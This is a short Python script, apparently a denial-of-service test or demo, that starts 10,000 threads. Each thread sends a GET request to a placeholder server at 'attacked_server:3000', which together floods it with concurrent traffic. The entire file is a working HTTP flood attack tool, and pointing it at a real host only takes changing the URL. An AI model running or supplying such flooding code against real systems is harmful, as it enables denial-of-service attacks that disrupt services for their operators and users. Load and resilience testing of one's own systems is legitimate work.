import threading

import requests

NUM_REQUESTS = 10000  # Number of requests to send concurrently

def get_flood_attack():
    url = 'http://attacked_server:3000'
    try:
        response = requests.get(url)
        print(f"Response from attacked server: {response.status_code}, {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

if __name__ == "__main__":
    # Launch multiple threads to simulate concurrent GET requests
    threads = []
    for _ in range(NUM_REQUESTS):
        thread = threading.Thread(target=get_flood_attack)
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()
